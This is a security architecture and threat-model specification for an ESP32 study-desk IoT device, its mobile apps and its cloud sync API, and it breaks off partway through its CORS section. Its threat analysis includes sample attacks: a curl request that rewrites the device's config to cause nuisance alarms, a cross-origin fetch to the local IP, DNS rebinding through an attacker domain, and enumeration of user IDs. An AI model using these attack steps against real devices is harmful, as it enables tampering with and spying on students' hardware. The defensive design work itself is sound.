# StudySense Smart Desk Companion System
## Master Security Architecture, Threat Model & Implementation Specification

**Document Identifier:** SEC-ARCH-STUDYSENSE-v1.0  
**Target Architecture:** ESP32-WROOM-32 (Xtensa Dual-Core LX6 @ 240MHz, 520KB SRAM, 4MB Flash)  
**Client Applications:** Apple iOS (SwiftUI + WKWebView), Google Android (Java + WebView), Web/PWA (Vercel)  
**Cloud Infrastructure:** Vercel Serverless Sync Engine (`/api/sync`)  
**Status:** APPROVED / PRODUCTION BLUEPRINT  
**Date:** 2026-11-24  

---

## 1. Executive Summary & Architectural Scope

The **StudySense Smart Desk Companion System** is a distributed IoT solution designed to monitor, guide, and enhance student focus, posture, and study habits. The system integrates:
1. **Edge Hardware Layer**: An ESP32 microcontroller operating ultrasonic distance sensors (HC-SR04), passive infrared presence detection (HC-SR501), audiovisual alert indicators (LED ring/discrete LEDs and piezo buzzer), physical session controls, and an embedded HTTP web server on port 80.
2. **Client Gateway Layer**: Cross-platform client applications spanning native iOS (Swift/WKWebView), native Android (Java/WebView), and public Web PWA (`https://studysense-eight.vercel.app`). Client applications connect locally to the ESP32 over Wi-Fi and communicate upstream to cloud services over HTTPS.
3. **Cloud Infrastructure Layer**: A serverless synchronization backend hosted on Vercel (`/api/sync`) responsible for cross-device telemetry backup, profile synchronization, and historical study statistics.

### 1.1 The Core Security Problem
In early revisions of the StudySense system, the edge hardware and network interfaces were designed with development convenience prioritized over security:
- **SoftAP Default Credentials**: The ESP32 broadcast a globally static SSID (`StudyMonitor`) with a hardcoded, public passphrase (`study1234`).
- **Unauthenticated HTTP Control**: The embedded web server exposed sensitive endpoints (`/config`, `/status`, `/timer`, `/api/cmd`) with zero authentication, zero authorization, and wildcard CORS (`Access-Control-Allow-Origin: *`).
- **Network Exposure**: Any device on the same local network (e.g., student dormitory, school lab, family home, or rogue device within RF range) could hijack hardware state, disrupt study sessions, alter posture thresholds, or repeatedly trigger buzzer alarms.
- **Flash Memory Wear-Out**: HTTP configuration writes synchronously committed to SPI NOR flash without rate limiting, allowing malicious actors to permanently destroy the ESP32 hardware via write-cycle exhaustion.
- **Cloud Authorization Absence**: The cloud synchronization endpoint (`/api/sync`) relied on client-supplied `x-user-id` headers without tokens, enabling Broken Object Level Authorization (BOLA/IDOR) data exfiltration and tampering.
- **Student Privacy & Regulatory Non-Compliance**: Raw physical presence and posture telemetry were exposed over cleartext HTTP and unauthenticated cloud endpoints, violating COPPA, GDPR, and FERPA.

### 1.2 System Topology & Gateway Architecture
To resolve these vulnerabilities while operating within the strict memory and processing budgets of the ESP32, StudySense adopts a **Client-Brokered Gateway Architecture with Local-First Cryptographic Authentication**:

```
+---------------------------------------------------------------------------------------------------------+
|                                           SYSTEM DATA TOPOLOGY                                          |
+---------------------------------------------------------------------------------------------------------+
                                                                                                          
   +-----------------------+              Local Wi-Fi Network / SoftAP             +-------------------+  
   |                       |  <==================================================> |                   |  
   |      ESP32 EDGE       |         HTTP/1.1 with HMAC-SHA256 Request Signing     |   CLIENT GATEWAY  |  
   |      HARDWARE         |          - Mutual Pre-Shared Key (PSK)                |   (iOS / Android  |  
   |  - Sensors (PIR, US)  |          - Nonce + Timestamp Replay Protection        |    / Web PWA)     |  
   |  - Actuators (LED/Bz) |          - Flash Write Coalescing & Dirty-Check       |  - Keychain / KS  |  
   |  - Port 80 WebServer  |          - Strict Host Header & Origin Lockdown       |  - Native Bridge  |  
   |                       |                                                       |                   |  
   +-----------------------+                                                       +-------------------+  
                                                                                             │            
                                                                             HTTPS / TLS 1.3 │ (Internet) 
                                                                             - Bearer JWT    │            
                                                                             - Schema Sanit. │            
                                                                                             ▼            
                                                                                   +-------------------+  
                                                                                   |   VERCEL CLOUD    |  
                                                                                   |  SERVERLESS SYNC  |  
                                                                                   |  - Persistent DB  |  
                                                                                   |  - COPPA / GDPR   |  
                                                                                   |  - Rate Limiting  |  
                                                                                   +-------------------+  
```

---

## 2. Threat Analysis & Security Architecture (R1)

### 2.1 Threat Modeling Methodology & System Boundaries
The threat landscape is evaluated using the **STRIDE** model (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) across six critical trust boundaries:
- **Boundary 1: Radio Layer (SoftAP & BLE)**: RF perimeter within ~30–50 meters of the desk companion.
- **Boundary 2: Local Subnet (Station Mode LAN)**: All devices sharing the local residential, campus, or school Wi-Fi network.
- **Boundary 3: Edge Web Server (Port 80)**: Inbound HTTP handlers on the ESP32.
- **Boundary 4: Physical Hardware & Storage**: Physical access to the ESP32 GPIO, UART, and SPI NOR Flash.
- **Boundary 5: Client Application Runtime**: WebKit/Chromium sandbox, local storage, and native bridges on iOS and Android.
- **Boundary 6: Cloud Synchronization Endpoint**: Public Internet surface of Vercel edge functions.

### 2.2 STRIDE Threat Classification Matrix

| Threat Category | Threat ID | Target Boundary | Attack Vector & Mechanism | Impact Severity | Primary Mitigation |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Spoofing** | T-SP-01 | Cloud Sync | Attacker sends arbitrary `x-user-id` in `/api/sync` to read/write another student's profile. | **CRITICAL** | Mandatory Bearer JWT authentication verified at cloud boundary with mandatory `exp` claim and zero static secret fallback. |
| **Spoofing** | T-SP-02 | Local HTTP | Rogue device impersonates authorized companion app and issues `/config` or `/api/cmd` updates. | **CRITICAL** | HMAC-SHA256 signature verification over Method + Path (+ Query String) + Timestamp + Nonce + Body using paired PSK with $\pm 300\text{s}$ drift guard. |
| **Spoofing** | T-SP-03 | SoftAP | Rogue AP with SSID `StudyMonitor` intercepts client Wi-Fi associations. | **HIGH** | Unique MAC-derived SSID (`StudySense-XXXX`) and factory setup PIN. |
| **Tampering** | T-TM-01 | Local HTTP | Man-in-the-Middle (MitM) alters posture thresholds or timer states in cleartext packets. | **HIGH** | Cryptographic digest in HMAC-SHA256 with full query-string binding prevents payload modification. |
| **Tampering** | T-TM-02 | Cloud Sync | Attacker injects malformed or malicious script fields into profile JSON payload. | **MEDIUM** | Strict schema validation, sanitization of string inputs, and range clamping. |
| **Repudiation** | T-RP-01 | Edge Hardware | Disputed modification of desk profile settings or study session durations. | **LOW** | Monotonic nonce tracking and state-transition audit logging on device. |
| **Information Disclosure** | T-ID-01 | Local HTTP | Eavesdropping on `/status` exposes live student presence (PIR) and posture distance. | **HIGH** | Pairing ceremony, HMAC authenticated access, and AP client isolation guidance. |
| **Information Disclosure** | T-ID-02 | Cloud Sync | Enumerate `?userId=user_<timestamp>` to dump thousands of student profiles. | **CRITICAL** | Complete removal of query-based IDOR; user ID extracted strictly from cryptographically validated JWT. |
| **Information Disclosure** | T-ID-03 | Web Client | Malicious web page fetches `http://192.168.4.1/status` via browser cross-origin requests. | **HIGH** | Ban wildcard CORS (`*`), eliminate reflection of `Origin: null` (closing sandboxed iframe exploit), and mandate custom preflight headers. |
| **Denial of Service** | T-DS-01 | Hardware Flash | Attacker loops automated `POST /config` requests to exhaust flash write endurance. | **CRITICAL** | In-memory RAM profile caching, dirty-check comparison, minimum 60s uptime guard, and debounced coalesced commits. |
| **Denial of Service** | T-DS-02 | Edge Web Server | Slowloris or socket exhaustion attacks against ESP32 `WebServer` 4-client socket pool. | **HIGH** | Aggressive socket read/write timeouts (3000ms), connection keep-alive limits, and leaky-bucket rate limiting. |
| **Denial of Service** | T-DS-03 | Cloud Sync | Memory exhaustion of ephemeral serverless container via oversized JSON payloads. | **MEDIUM** | Enforce 16KB max payload limit on `/api/sync` and migrate to persistent database backing. |
| **Elevation of Privilege** | T-EP-01 | Edge Hardware | Unauthorized client triggers `/api/cmd?action=reset` or changes profile index. | **HIGH** | Enforce HMAC authentication across all endpoints, including command routes, with query parameter binding. |
| **Elevation of Privilege** | T-EP-02 | Web Client | Malicious site utilizes DNS rebinding to execute arbitrary commands against `192.168.4.1`. | **HIGH** | Validate `Host` header strictly and unconditionally against ESP32 local IP, `studysense.local` (case-insensitive), or `192.168.4.1`. |
| **Elevation of Privilege** | T-EP-03 | Mobile Bridge | Malicious script instructs native bridge to sign and transmit requests to arbitrary domains (SSRF & HMAC oracle). | **HIGH** | Strict native bridge destination URL whitelisting (`192.168.4.1`, `studysense.local`, RFC 1918 local DHCP subnets `192.168.*.*` / `10.*.*.*` / `172.16–31.*.*`, and `https://studysense-eight.vercel.app`). |
| **Elevation of Privilege** | T-EP-04 | Mobile Bridge | Injected script in bridge callback strings executes in WebView security context. | **HIGH** | Harmonized 4-argument callback `window._onNativeBridgeResponse(callbackId, success, statusCode, responseData)` serialized via `JSONSerialization` (iOS) / `JSONArray`+`JSONObject` (Android) with alphanumeric `callbackId` sanitization. |

### 2.3 Detailed Threat Vector Analysis

#### Threat Vector 1: Rogue Device Connection on Same Wi-Fi / SoftAP
- **Vulnerability Mechanism**: The original firmware configured `WiFi.softAP("StudyMonitor", "study1234")` in `SmartStudyMonitor.ino:53-54`. Because these credentials were static and published in the repository `README.md`, any unauthorized individual within RF range could connect. Once connected to the SoftAP subnet (`192.168.4.0/24`), the rogue device possessed direct IP reachability to port 80.
- **Exploitation Impact**: An attacker can inspect real-time sensor data to determine when a child or student is physically at their desk, modify posture parameters to trigger nuisance alarms, or shut off the companion during exams.
- **Architectural Mitigation**: Transition SoftAP to an on-demand, time-bounded commissioning mode. SoftAP SSID is dynamically derived from the hardware MAC address (`StudySense-A1B2`), secured by a high-entropy CSPRNG setup key, limited to 1 connected client, and automatically terminated after 5 minutes or upon Station mode association. In addition, DHCP leases are reclaimed upon client disassociation to prevent lease starvation under mobile MAC address randomization.

#### Threat Vector 2: Local Unauthenticated HTTP API Abuse
- **Vulnerability Mechanism**: In `SmartStudyMonitor.ino:636-705`, all HTTP routes (`/api/status`, `/status`, `/api/cmd`, `/timer`, `/config`) were registered without any authentication guards.
- **Exploitation Impact**: Anyone on the local network could issue a single `curl -X POST http://<esp32-ip>/config -d '{"minPostureDistCm":100}'` to cause the desk companion to sound a continuous buzzer alarm whenever the user sits closer than 1 meter. Intercepted command requests could be manipulated (e.g. mutating `action=startPause` to `action=reset`) if query parameters are not cryptographically bound.
- **Architectural Mitigation**: Mandatory application-layer HMAC-SHA256 signature verification across all endpoints. Canonical signature string formulation includes the full URI path and query string (`path + (query ? "?" + query : "")`). Requests lacking a valid signature derived from the paired Pre-Shared Key (PSK), requests with expired timestamps ($>300\text{s}$), or requests with empty PSK are rejected prior to any state processing.

#### Threat Vector 3: Drive-By Cross-Origin CSRF & DNS Rebinding via Wildcard CORS
- **Vulnerability Mechanism**: `sendCorsHeaders()` in `SmartStudyMonitor.ino:444` injected `Access-Control-Allow-Origin: *`. If a student browsed the web on a laptop or tablet connected to the home network, a malicious webpage could issue `fetch("http://192.168.4.1/config", {method: "POST", body: ...})`. Because wildcard CORS was present, the browser allowed the script to read responses and execute state changes. Furthermore, an attacker using DNS rebinding could point a domain with a low TTL (e.g. `rebind.attacker.com`) first to an external server and then to `192.168.4.1`, bypassing the browser's Same-Origin Policy. Reflecting `Access-Control-Allow-Origin: null` also enables sandboxed iframes (`<iframe sandbox="allow-scripts">`) on third-party sites to read local ESP32 telemetry.
- **Architectural Mitigation**: 
  1. Ban `Access-Control-Allow-Origin: *` and completely eliminate reflection of `Origin: null`. Sandboxed iframes sending `Origin: null` are strictly denied cross-origin reads. Native mobile applications use native background URLSession/OkHttp bridges and do not rely on browser CORS.
  2. Require custom headers (`X-StudySense-Timestamp`, `X-StudySense-Nonce`, `X-StudySense-Signature`), which trigger browser CORS preflight (`OPTIONS`). Explicit preflight handlers (`HTTP_OPTIONS`) are registered across all endpoints (`/status`, `/config`, `/timer`, `/api/cmd`, `/api/pair`).
  3. Validate the HTTP `Host` header unconditionally against `WiFi.localIP()`, `WiFi.softAPIP()`, `studysense.local` (case-insensitive per RFC 7230), or `192.168.4.1`, executing **before** any provisioning or authentication bypass.

#### Threat Vector 4: Flash Memory Wear-Out Denial-of-Service (Flash Wear-Out DoS)
- **Vulnerability Mechanism**: In `SmartStudyMonitor.ino:701` and `StudySense_ESP32.ino:179`, incoming `POST /config` requests immediately invoked `saveProfileToPrefs(activeProfileIdx)` or `saveProfileToFlash()`. SPI NOR flash sectors on the ESP32 typically tolerate between 10,000 and 100,000 erase/write cycles before physical oxide breakdown causes irreversible memory corruption.
- **Exploitation Impact**: A script issuing 10 requests per second can consume 100,000 write cycles in less than 3 hours, permanently destroying the ESP32 module.
- **Architectural Mitigation**: 
  1. Maintain active profile configuration in volatile SRAM (`UserProfile profiles[3]`).
  2. Implement **Dirty Checking**: Compare incoming values with the in-memory profile. If all parameters are identical, bypass flash writes entirely.
  3. Implement **Coalesced Commits**: Mark dirty state and buffer writes, committing to NVS flash at most once every 60 seconds or upon explicit, rate-limited shutdown events.

#### Threat Vector 5: TCP Socket Exhaustion
- **Vulnerability Mechanism**: The ESP32 Arduino `WebServer` library operates synchronously on top of the lwIP TCP stack with a default limit of 4 concurrent client sockets.
- **Exploitation Impact**: An attacker or misbehaving client opening 4 half-open TCP connections (Slowloris) completely freezes the web server, preventing legitimate mobile apps from synchronizing.
- **Architectural Mitigation**: Configure aggressive socket timeouts (3 seconds for client header receipt) and enforce rate limiting (maximum 5 requests per second per IP address).

#### Threat Vector 6: Parameter Parsing Desynchronization & Substring Offset Vulnerability
- **Vulnerability Mechanism**: `SmartStudyMonitor.ino:693-700` parsed JSON using fragile hardcoded string offsets:
  `p.studyMins = constrain(body.substring(sIdx + 20).toInt(), 1, 180);`
  If a client sent formatted JSON with extra spaces, tabs, or newlines (e.g. `{"studyDurationMins":  25}`), the substring parsed empty text or erroneous characters, resulting in value truncation or zeroed configurations.
- **Architectural Mitigation**: Replace manual substring slicing with deterministic AST deserialization via `ArduinoJson v6/v7` with strict type checking and range clamping.

#### Threat Vector 7: Unauthenticated & Unbonded BLE GATT Sniffing and Injection
- **Vulnerability Mechanism**: `SmartStudyMonitor.ino:775-797` exposed open GATT characteristics (`beb5483e...` for status notify and `82896244...` for command write) without BLE Security Manager pairing, PIN confirmation, or encryption.
- **Exploitation Impact**: Any central device within Bluetooth range could subscribe to status notifications and write raw command bytes.
- **Architectural Mitigation**: If BLE is enabled, configure BLE Security Manager with `ESP_LE_AUTH_REQ_SC_MITM_BOND` and static passkey authentication. If Wi-Fi is active, provide an automated radio coexistence policy that puts BLE into deep sleep to conserve SRAM and eliminate the BLE attack surface.

#### Threat Vector 8: Cloud Sync Broken Object Level Authorization (BOLA / IDOR)
- **Vulnerability Mechanism**: `api/sync.js:21` extracted identity directly from unverified request parameters: `const userId = req.headers['x-user-id'] || req.query.userId || 'studysense_user';`.
- **Exploitation Impact**: Attackers can iterate through sequential millisecond timestamps (`user_1732451408000`, `user_1732451409000`) to dump private student profiles or overwrite profiles belonging to other users.
- **Architectural Mitigation**: Transition from unauthenticated `x-user-id` to cryptographically signed Bearer JWTs (`Authorization: Bearer <token>`). The cloud function validates the signature, checks expiration (`exp`), and derives `userId` exclusively from the verified token claim (`sub`).

---

### 2.4 Defense-in-Depth Architectural Blueprint

The StudySense security architecture is structured across four defense concentric rings:

```
+---------------------------------------------------------------------------------------------------------+
|                                    DEFENSE-IN-DEPTH SYSTEM BLUEPRINT                                    |
+---------------------------------------------------------------------------------------------------------+

  [RING 1: RADIO & NETWORK PERIMETER]
  +-----------------------------------------------------------------------------------------------------+
  | - SoftAP: MAC-derived dynamic SSID (StudySense-XXXX) + High-entropy Setup Key (WPA2-PSK)            |
  | - Hardware Provisioning Window: 5-minute auto-timeout triggered by physical button press             |
  | - Radio Shutdown: SoftAP disabled immediately upon Station mode connection or timeout              |
  | - DNS Rebinding Shield: Host header verification (rejects non-local / non-whitelisted hosts)        |
  +-----------------------------------------------------------------------------------------------------+
                                                    │
                                                    ▼
  [RING 2: APPLICATION-LAYER TRANSPORT & INTEGRITY]
  +-----------------------------------------------------------------------------------------------------+
  | - Mutual Pre-Shared Key (PSK): 256-bit symmetric secret established during initial pairing          |
  | - Request Signing: HMAC-SHA256(Method + URI + Timestamp + Nonce + Body, PSK)                       |
  | - Replay Protection: Sliding Nonce Ring Buffer (32 slots) + ±300s Timestamp Skew Window             |
  | - Timing-Safe Verification: Constant-time byte-level comparison preventing side-channel attacks    |
  | - CORS Lockdown: Strict Origin whitelist reflecting trusted app origins; complete ban on wildcard *|
  +-----------------------------------------------------------------------------------------------------+
                                                    │
                                                    ▼
  [RING 3: EDGE HARDWARE RESILIENCE & INTEGRITY]
  +-----------------------------------------------------------------------------------------------------+
  | - Flash Wear-Out Shield: In-memory RAM profile caching + Dirty-check bypass on duplicate data      |
  | - Coalesced Writes: Commits to NVS flash debounced to max 1 write per 60 seconds                   |
  | - DoS Throttling: Leaky-bucket rate limiter (5 req/s telemetry, 1 req/10s config updates)           |
  | - Memory Isolation: Hardware crypto engine (Xtensa SHA-256) consumes <12KB SRAM vs >45KB for TLS   |
  +-----------------------------------------------------------------------------------------------------+
                                                    │
                                                    ▼
  [RING 4: CLOUD & CLIENT SECURE STORAGE]
  +-----------------------------------------------------------------------------------------------------+
  | - Client Storage: Apple Keychain (iOS) & Android Keystore EncryptedSharedPreferences (AES-256-GCM)  |
  | - Native Network Bridge: Resolves mobile file:///api/sync deadlock via Swift/Java background relay |
  | - Cloud Boundary: Bearer JWT verification (RS256/EdDSA/HMAC) on /api/sync                          |
  | - Storage Persistence: Vercel KV / Redis replacing ephemeral memoryStore with student data privacy |
  +-----------------------------------------------------------------------------------------------------+
```

---

### 2.5 Security State Transition Model

The ESP32 firmware executes a deterministic state machine governing network exposure:

```
                    +---------------------------+
                    |       BOOT / RESET        |
                    +---------------------------+
                                  │
                                  ▼
                    +---------------------------+
                    | Read NVS Configuration    |
                    | (Check for Saved Wi-Fi)   |
                    +---------------------------+
                                  │
                    +-------------+-------------+
                    │                           │
        [No Credentials Saved]      [Credentials Exist]
                    │                           │
                    ▼                           ▼
       +-------------------------+ +-------------------------+
       |   STATE_PROVISIONING    | |     STATE_CONNECTING    |
       | - Start SoftAP          | | - Connect to Target AP  |
       |   (StudySense-XXXX)     | | - Timeout: 15 Seconds   |
       | - 5-Min Timer Running   | +-------------------------+
       | - Awaiting Pairing PIN  |              │
       +-------------------------+      +-------+-------+
                    │                   │               │
        [Pairing Successful]        [Success]       [Timeout/Fail]
                    │                   │               │
                    ▼                   ▼               ▼
       +-------------------------+ +---------+ +-----------------+
       | Save Wi-Fi & PSK to NVS | |  STATE_ | | STATE_ISOLATED_ |
       | Shutdown SoftAP Radio   | | STATION | | STANDBY         |
       +-------------------------+ | LOCKED  | | - Wi-Fi OFF     |
                    │              +---------+ | - Offline Desk  |
                    └───────────────────┘      |   Monitor Only  |
                                               +-----------------+
```

---

## 3. Wi-Fi & Network Isolation Security (R2)

### 3.1 SoftAP Hardening Specification
When operating in Access Point mode for device setup, the ESP32 must never expose a static or guessable identity:

1. **Dynamic MAC-Derived SSID**:
   - The SSID format is strictly defined as `StudySense-[MAC12]`, where `[MAC12]` is the uppercase hexadecimal representation of the last 2 bytes (last 4 hex digits) of the ESP32 base Wi-Fi MAC address.
   - Example: Base MAC `24:6F:28:AB:12:34` yields SSID `StudySense-1234`.
   - Implementation:
     ```cpp
     uint8_t baseMac[6];
     esp_read_mac(baseMac, ESP_MAC_WIFI_STA);
     char dynamicSsid[32];
     snprintf(dynamicSsid, sizeof(dynamicSsid), "StudySense-%02X%02X", baseMac[4], baseMac[5]);
     ```
2. **Device-Unique Setup Passphrase**:
   - The SoftAP WPA2-PSK passphrase must be unique per physical hardware unit.
   - Upon first factory boot, the firmware checks NVS namespace `studysense_sec` for key `setup_pin`. If empty, it generates a 10-character alphanumeric setup key using the hardware True Random Number Generator (`esp_random()`):
     ```cpp
     const char charset[] = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"; // Base32 without ambiguous chars (0,1,I,O)
     char setupPin[11];
     for (int i = 0; i < 10; i++) {
         setupPin[i] = charset[esp_random() % (sizeof(charset) - 1)];
     }
     setupPin[10] = '\0';
     ```
   - This setup key is printed to the serial console on first boot and printed on the physical device enclosure label. It is never transmitted unencrypted over the air.
3. **Hardware Commissioning Window & Physical Button Trigger**:
   - SoftAP mode is **disabled by default**.
   - To trigger provisioning, the user must physically hold the desk companion control button (`PIN_BUTTON = 22`) for **5 continuous seconds**.
   - Upon detection, the firmware transitions to `STATE_PROVISIONING`, illuminates the onboard LED with a flashing cyan cadence, and starts the SoftAP with a strict **5-minute (300-second) watchdog timer**.
   - If no valid pairing handshake occurs within 300 seconds, the firmware automatically calls `WiFi.softAPdisconnect(true)` and enters offline standby.
4. **Immediate SoftAP Termination**:
   - Once Station credentials are submitted and verified, or once the pairing handshake completes, the SoftAP radio is immediately disabled. The ESP32 never runs concurrent SoftAP + Station mode (APSTA) during normal operation, eliminating the bridge attack vector.
5. **Connection Limiting**:
   - `WiFi.softAP(dynamicSsid, setupPin, 1, 0, 1);` restricts maximum concurrent associations to **1 client**, preventing third-party eavesdroppers from joining during the pairing window.
6. **SoftAP DHCP Lease Reclamation & Starvation Defense**:
   - Under modern mobile OS privacy features (iOS 14+ Private Wi-Fi Address and Android 10+ MAC randomization), mobile devices may present randomized MAC addresses across repeated association attempts.
   - Because the ESP-IDF lwIP DHCP server (`dhcps`) maintains a limited pool of 4-8 leases with a 7,200-second default timeout, multiple quick reconnects could exhaust the lease pool and lock out the device for 2 hours.
   - The firmware listens for `ARDUINO_EVENT_WIFI_AP_STADISCONNECTED`. Upon station disassociation, it immediately resets the DHCP server lease table via `esp_netif_dhcps_stop()` and `esp_netif_dhcps_start()`, instantly recycling `192.168.4.2` for subsequent attempts. The DHCP lease time is configured to 300 seconds, strictly aligning with the commissioning window.

### 3.2 Station Mode LAN Security & Isolation
When connected to an existing Wi-Fi network:
1. **WPA2/WPA3 Support**: The ESP32 Arduino core supports WPA2-Personal and WPA3-SAE. WPA3 transition mode is enabled by default to protect against offline dictionary attacks against Wi-Fi handshakes.
2. **Encrypted NVS Credential Storage**:
   - Wi-Fi SSIDs and passwords are saved in ESP32 Preferences/NVS with non-volatile security partition flags. In production deployments, ESP32 NVS Encryption (using an AES-256 key stored in eFuse block) is enabled to prevent hardware dumping via SPI flash programmers.
3. **Mitigating Lack of AP Client Isolation**:
   - On many residential or public Wi-Fi networks, AP Client Isolation (which blocks peer-to-peer traffic between wireless clients) is disabled. Any device on the network can broadcast ARP packets and probe peer IPs.
   - **Architectural Defense**: StudySense assumes the local network is hostile. Network-layer reachability to port 80 does **not** confer administrative access. Every single interaction on port 80 requires a cryptographic HMAC signature generated by the paired mobile app, neutralizing rogue devices on the same subnet.

---

## 4. Local Endpoint Authentication & Access Control (R3)

### 4.1 Cryptographic Authentication Mechanism (HMAC-SHA256)
Because local HTTPS on the ESP32 introduces catastrophic memory exhaustion and certificate validation failures in mobile WebViews (see Section 6), authentication is established at the application layer using **HMAC-SHA256 Request Signing** with a symmetric 256-bit Pre-Shared Key (PSK).

#### Request Header Specification
Every authenticated HTTP request from the client app to the ESP32 (`/config`, `/status`, `/timer`, `/api/cmd`) must include three cryptographic headers:

| Header Name | Type | Description | Example |
| :--- | :--- | :--- | :--- |
| `X-StudySense-Timestamp` | String (Integer) | Current UTC Unix epoch seconds. | `1732451408` |
| `X-StudySense-Nonce` | String (Hex) | 16-character hexadecimal random nonce (8 bytes). | `4a8f9c1b2e3d4f50` |
| `X-StudySense-Signature` | String (Hex) | 64-character hexadecimal HMAC-SHA256 signature. | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |

#### Canonical String Formulation & Query Parameter Binding
The signature is computed over a strictly ordered, newline-delimited canonical string that binds the HTTP method, endpoint path, query parameters, timestamp, nonce, and payload body:

$$\text{CanonicalString} = \text{HTTP\_METHOD} \mathbin{\Vert} \text{"\textbackslash n"} \mathbin{\Vert} \text{URI\_PATH} \mathbin{\Vert} (\text{QUERY\_STRING} \ne \text{""} \mathrel{?} \text{"?"} \mathbin{\Vert} \text{QUERY\_STRING} : \text{""}) \mathbin{\Vert} \text{"\textbackslash n"} \mathbin{\Vert} \text{TIMESTAMP} \mathbin{\Vert} \text{"\textbackslash n"} \mathbin{\Vert} \text{NONCE} \mathbin{\Vert} \text{"\textbackslash n"} \mathbin{\Vert} \text{REQUEST\_BODY}$$

- `HTTP_METHOD`: Uppercase method string (e.g., `POST` or `GET`).
- `URI_PATH`: Exact endpoint path without trailing slashes (e.g., `/config`, `/status`, or `/api/cmd`).
- `QUERY_STRING`: Reconstructed raw query string (e.g. `action=startPause` or `action=reset`). Binding query parameters is **mandatory**; otherwise, an attacker on the LAN could capture an authenticated `GET /api/cmd?action=startPause` and rewrite it in flight to `GET /api/cmd?action=reset` without invalidating the cryptographic signature.
- `TIMESTAMP`: The exact decimal string transmitted in `X-StudySense-Timestamp`.
- `NONCE`: The exact hexadecimal string transmitted in `X-StudySense-Nonce`.
- `REQUEST_BODY`: The exact UTF-8 raw payload string for POST requests, or empty string `""` for GET/OPTIONS requests.

$$\text{Signature} = \text{HexEncode}\Big(\text{HMAC-SHA256}\big(\text{PSK}, \text{CanonicalString}\big)\Big)$$

### 4.2 Replay Protection, Timestamp Drift & Eviction Resistance
To defeat packet capture and retransmission (replay attacks) across both immediate and delayed replay vectors:

1. **Strict Runtime Timestamp Window Verification**:
   - The ESP32 enforces runtime validation that:
     $$|T_{\text{device}} - T_{\text{request}}| \le 300\text{ seconds (5 minutes)}$$
   - Device time is established via SNTP (`pool.ntp.org`) when connected to station Wi-Fi, or synchronized directly with the paired mobile client's verified timestamp during initial pairing handshake (`lastSyncEpoch = reqTs; lastSyncMillis = millis();`).
   - If $|T_{\text{device}} - T_{\text{request}}| > 300\text{s}$, the request is rejected with `HTTP 403 Forbidden` (`{"error":"Timestamp expired or clock skew exceeded"}`).
2. **Pre-Shared Key Initialization Guard**:
   - The firmware explicitly checks `if (devicePsk.length() < 32)` before computing signatures. An unprovisioned or factory-reset device immediately rejects incoming requests with `HTTP 503 Service Unavailable` (`{"error":"Device not paired: PSK uninitialized"}`), preventing attackers from authenticating with an empty-key HMAC signature.
3. **Enhanced 64-Slot Sliding Nonce Cache with Timestamp Tracking**:
   - Nonces are stored in a 64-slot ring buffer alongside their arrival timestamps: `struct NonceEntry { String nonce; unsigned long timestamp; };`.
   - Incoming nonces are checked against all active slots in the ring buffer. If a match is found, the request is rejected with `HTTP 403 Forbidden` (`{"error":"Replay detected: Nonce already used"}`).
   - **Eviction Replay Prevention**: In early designs, rapid 1.5s background polling from mobile apps could evict a captured nonce in under 48 seconds, allowing delayed replays within the 300s window. StudySense prevents this by:
     a) Doubling the cache depth to 64 slots (extending eviction time beyond typical active sessions).
     b) Enforcing monotonic timestamp high-water marking: any request whose timestamp predates the active 300-second window relative to the highest observed timestamp (`reqTs + 300 < maxObservedTimestamp`) is rejected immediately, even if its nonce has already been evicted from the buffer.

### 4.3 The One-Time Pairing Ceremony & Commissioning Protocol
The 256-bit PSK is generated during a controlled initial pairing ceremony:

```
+---------------------------------------------------------------------------------------------------------+
|                                        PAIRING CEREMONY SEQUENCE                                        |
+---------------------------------------------------------------------------------------------------------+

   USER / HARDWARE                 MOBILE CLIENT (APP)                 ESP32 FIRMWARE (SOFTAP)
         │                                  │                                     │
         │─── [Hold Button 5s] ─────────────┼────────────────────────────────────>│
         │    (Enters Provisioning)         │                                     │ (Starts SoftAP: StudySense-XXXX)
         │                                  │                                     │ (5-Min Watchdog Active)
         │─── [Read Enclosure Setup PIN] ──>│                                     │
         │    (Enters PIN in App UI)        │                                     │
         │                                  │─── Connect to SoftAP Wi-Fi ────────>│
         │                                  │                                     │
         │                                  │─── POST /api/pair ─────────────────>│
         │                                  │    {                                │
         │                                  │      "setupPin": "B8K9X2M4Q7",      │
         │                                  │      "clientName": "Student-iPhone" │
         │                                  │    }                                │
         │                                  │                                     │ (Validate Setup PIN in NVS)
         │                                  │                                     │ (Generate 256-bit Random PSK)
         │                                  │                                     │ (Save PSK in NVS: studysense_sec)
         │                                  │<── 200 OK ──────────────────────────│
         │                                  │    {                                │
         │                                  │      "status": "paired",            │
         │                                  │      "devicePsk": "<64-hex-chars>"  │
         │                                  │    }                                │
         │                                  │                                     │
         │                                  │ (Store PSK in Keychain / Keystore)  │
         │                                  │                                     │
         │                                  │─── POST /api/provision-wifi ───────>│ (Authenticated with new PSK)
         │                                  │    { "ssid": "HomeNet", "pass":.. } │
         │                                  │                                     │ (Save Wi-Fi to NVS)
         │                                  │<── 200 OK ──────────────────────────│
         │                                  │                                     │
         │                                  │                                     │── [Shutdown SoftAP]
         │                                  │                                     │── [Connect to HomeNet]
```

#### Concrete Commissioning Endpoints:
1. `POST /api/pair`:
   - Gated strictly by `isProvisioningMode == true` (triggered by physical 5-second button press). Requests outside provisioning mode receive `HTTP 403 Forbidden`.
   - Validates `setupPin` against the NVS factory pin.
   - Generates a 256-bit CSPRNG PSK (64 hex characters) using `esp_random()`, saves it to NVS namespace `studysense_sec`, establishes the device clock epoch baseline from client `X-StudySense-Timestamp`, and returns `{"status":"paired","devicePsk":"<64-hex-chars>"}`.
2. `POST /api/provision-wifi`:
   - Requires full HMAC-SHA256 signature verification using the freshly established PSK.
   - Accepts target station SSID and passphrase, stores them in NVS, initiates connection to the home Wi-Fi network, and cleanly disables the SoftAP.

#### Revocation & Re-Pairing Protocol
To revoke access or transfer ownership:
- A continuous **15-second button press** triggers a full factory security wipe:
  1. `secPrefs.clear()` erases the NVS namespace `studysense_sec`.
  2. The active PSK and Wi-Fi credentials are destroyed.
  3. A new random setup key is generated.
  4. The ESP32 triggers a hardware restart (`ESP.restart()`).

### 4.4 CORS Lockdown, Sandboxed Iframe Defense & Anti-DNS Rebinding
1. **Elimination of `Origin: null` Reflection (Sandboxed Iframe Defense)**:
   - Wildcard `Access-Control-Allow-Origin: *` is completely removed.
